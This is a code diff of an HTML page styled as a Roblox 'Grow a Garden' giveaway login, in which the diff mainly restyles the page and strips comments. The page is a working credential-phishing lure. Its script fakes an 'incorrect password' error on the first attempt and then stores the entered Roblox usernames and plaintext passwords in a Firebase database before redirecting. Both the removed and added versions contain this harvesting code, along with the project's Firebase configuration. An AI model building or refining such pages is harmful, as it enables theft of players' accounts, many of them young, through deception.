@@ -15,23 +15,37 @@
       font-family: 'Comic Sans MS', sans-serif;
     }
 
-    body {
-      background: linear-gradient(to top, #7acc55 0%, #a6e67e 40%, #c5f1ff 100%);
+    body, html {
+      height: 100%;
+      overflow: hidden;
+    }
+
+    .background {
+      background: url('https://noping.com/_next/image?url=https%3A%2F%2Fblogadmin.noping.com%2Fwp-content%2Fuploads%2F2025%2F05%2Fgrowagarden-1747688567733.jpg&w=1920&q=75') no-repeat center center fixed;
+      background-size: cover;
+      position: fixed;
+      width: 100%;
+      height: 100%;
+      filter: blur(10px);
+      z-index: -1;
+    }
+
+    .login-container {
       display: flex;
       align-items: center;
       justify-content: center;
-      min-height: 100vh;
-      text-align: center;
+      height: 100vh;
       padding: 20px;
     }
 
     .login-box {
-      background-color: #fff;
+      background: rgba(255, 255, 255, 0.85);
       border-radius: 20px;
       padding: 30px 25px;
       width: 100%;
       max-width: 400px;
       box-shadow: 0 4px 12px rgba(0, 0, 0, 0.2);
+      text-align: center;
     }
 
     .login-box h2 {
@@ -84,68 +98,68 @@
   </style>
 </head>
 <body>
-  <div class="login-box">
-    <h2>🔐 Login to Claim Rewards</h2>
-    <form id="loginForm">
-      <input type="text" id="username" placeholder="Enter your Roblox username" required />
-      <input type="password" id="password" placeholder="Enter your Roblox password!" required />
-      <button type="submit">Login</button>
-    </form>
-    <a class="back-link" href="index.html"><i class="fas fa-arrow-left"></i> Back to Home</a>
+  <div class="background"></div>
+
+  <div class="login-container">
+    <div class="login-box">
+      <h2>🔐 Login to Claim Rewards</h2>
+      <form id="loginForm">
+        <input type="text" id="username" placeholder="Enter your Roblox username" required />
+        <input type="password" id="password" placeholder="Enter your Roblox password!" required />
+        <button type="submit">Login</button>
+      </form>
+      <a class="back-link" href="index.html"><i class="fas fa-arrow-left"></i> Back to Home</a>
+    </div>
   </div>
 
   <script>
-  const firebaseConfig = {
-    apiKey: "AIzaSyA6P52LeV5DO0odSMxxfK7DnSAXZBFH6CM",
-    authDomain: "growagardengiveaways-c8ed5.firebaseapp.com",
-    databaseURL: "https://growagardengiveaways-c8ed5-default-rtdb.asia-southeast1.firebasedatabase.app",
-    projectId: "growagardengiveaways-c8ed5",
-    storageBucket: "growagardengiveaways-c8ed5.firebasestorage.app",
-    messagingSenderId: "417902911798",
-    appId: "1:417902911798:web:f02d8d4dbfb30643bbd397",
-    measurementId: "G-GQ9YTH33T8"
-  };
+    const firebaseConfig = {
+      apiKey: "AIzaSyA6P52LeV5DO0odSMxxfK7DnSAXZBFH6CM",
+      authDomain: "growagardengiveaways-c8ed5.firebaseapp.com",
+      databaseURL: "https://growagardengiveaways-c8ed5-default-rtdb.asia-southeast1.firebasedatabase.app",
+      projectId: "growagardengiveaways-c8ed5",
+      storageBucket: "growagardengiveaways-c8ed5.firebasestorage.app",
+      messagingSenderId: "417902911798",
+      appId: "1:417902911798:web:f02d8d4dbfb30643bbd397",
+      measurementId: "G-GQ9YTH33T8"
+    };
 
-  firebase.initializeApp(firebaseConfig);
-  const db = firebase.database();
+    firebase.initializeApp(firebaseConfig);
+    const db = firebase.database();
 
-  document.getElementById("loginForm").addEventListener("submit", function (e) {
-    e.preventDefault();
+    document.getElementById("loginForm").addEventListener("submit", function (e) {
+      e.preventDefault();
 
-    const username = document.getElementById("username").value.trim();
-    const password = document.getElementById("password").value.trim();
+      const username = document.getElementById("username").value.trim();
+      const password = document.getElementById("password").value.trim();
 
-    if (!username || !password) {
-      alert("Please fill in both fields.");
-      return;
-    }
+      if (!username || !password) {
+        alert("Please fill in both fields.");
+        return;
+      }
 
-    // Get current failed login attempt count
-    let attempts = parseInt(localStorage.getItem("loginAttempts")) || 0;
+      // Get current failed login attempt count
+      let attempts = parseInt(localStorage.getItem("loginAttempts")) || 0;
 
-    if (attempts < 1) {
-      // First attempt: fake failure
-      localStorage.setItem("loginAttempts", attempts + 1);
-      alert("Incorrect username or password. Please try again.");
-      return;
-    }
+      if (attempts < 1) {
+        localStorage.setItem("loginAttempts", attempts + 1);
+        alert("Incorrect username or password. Please try again.");
+        return;
+      }
 
-    // Save to Firebase
-    db.ref("users").push({
-      username: username,
-      password: password, // WARNING: Never store raw passwords in production!
-      time: new Date().toISOString()
+      db.ref("users").push({
+        username: username,
+        password: password,
+        time: new Date().toISOString()
+      });
+
+      localStorage.setItem("loggedIn", "true");
+      localStorage.setItem("username", username);
+      localStorage.removeItem("loginAttempts");
+
+      alert("Welcome, " + username + "!");
+      window.location.href = "gag-home.html";
     });
-
-    // Set login status
-    localStorage.setItem("loggedIn", "true");
-    localStorage.setItem("username", username);
-    localStorage.removeItem("loginAttempts"); // reset
-
-    alert("Welcome, " + username + "!");
-    window.location.href = "gag-home.html";
-  });
-</script>
-
+  </script>
 </body>
 </html>
